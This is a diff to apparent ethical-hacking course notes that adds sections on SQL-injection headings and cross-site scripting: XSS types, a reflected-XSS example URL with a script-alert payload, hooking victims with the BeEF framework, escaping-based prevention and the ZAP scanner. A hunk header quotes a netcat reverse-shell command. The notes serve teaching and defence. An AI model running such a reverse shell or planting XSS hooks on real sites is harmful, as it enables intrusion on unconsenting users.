@@ -1405,7 +1405,7 @@ nc -e /bin/sh 10.20.14 8080
   - Disable allow_url_fopen & allow_url_include.
   - Use static file inclusion.
 
-## Exploitation - SQL Injection
+## Website Hacking : Exploitation - SQL Injection
 
 - **What SQL ?**
 - Most websites use a database to store data.
@@ -1485,6 +1485,60 @@ nc -e /bin/sh 10.20.14 8080
 - Filters can be bypassed.
 - Use black list of commands? Still can be bypassed
 - Use whitelist? Same issue
-
 - **BEST WAY**: Use parameterized statements, separate data from sql code.
- 
+
+## Website Hacking : Cross Site Scripting Vulnerebilities (XSS)
+
+- XSS - Cross Site Scripting vulns
+- Allow an attacker to inject javascript code into the page.
+- Code is executed when the page loads.
+- Code is executed on the client machine not the server.
+- Three main types:
+  1. Persistent/Stored XSS
+  2. Reflected XSS
+  3. DOM based XSS
+
+## Exploitation - XSS Vulns
+
+- **Discovering XSS**
+  - Try to inject javasript code into the pages.
+  - Test text boxes and url parameters on the form
+    - <http://target.com/page.php?something=something>
+- **Reflected XSS**
+  - None persistent, not stored.
+  - Only work if the target visits a specially crafted URL
+
+    ```js
+    EX http://target.com/page.php?something=<script>alert(“XSS”)</script>
+    ```
+
+- **Stored XSS**
+  - Persistent, stored on the page or DB.
+  - The injected code is executed everytime the page is loaded.
+  - text fields that accepts code and visible other users on the website (ex: comment sections)
+- **Exploiting XSS**
+  - Run any javascript code.
+  - Beef framework can be used to hook targets
+  - Inject Beef hook in vulnerable pages.
+  - Execute code from beef.
+- **Preventing XSS Vulns**
+  - Minimize the usage of user input on html.
+  - Escape any untrusted input before inserting it into the page.
+
+    ```txt
+    Char Result:
+      &     → &amp;
+      <      → &lt;
+      >      → &gt;
+      "      → &quot;
+      '      → &#x27;
+      /     → &#x2F;
+    ```
+
+  - <https://cheatsheetseries.owasp.org/cheatsheetsCross_Site_Scripting_Prevention_Cheat_Sheet.html>
+  
+## Zed Attack Proxy ZAP
+
+- Automatically find vulnerabilities in web applications.
+- Free and easy to use.
+- Can also be used for manual testing.
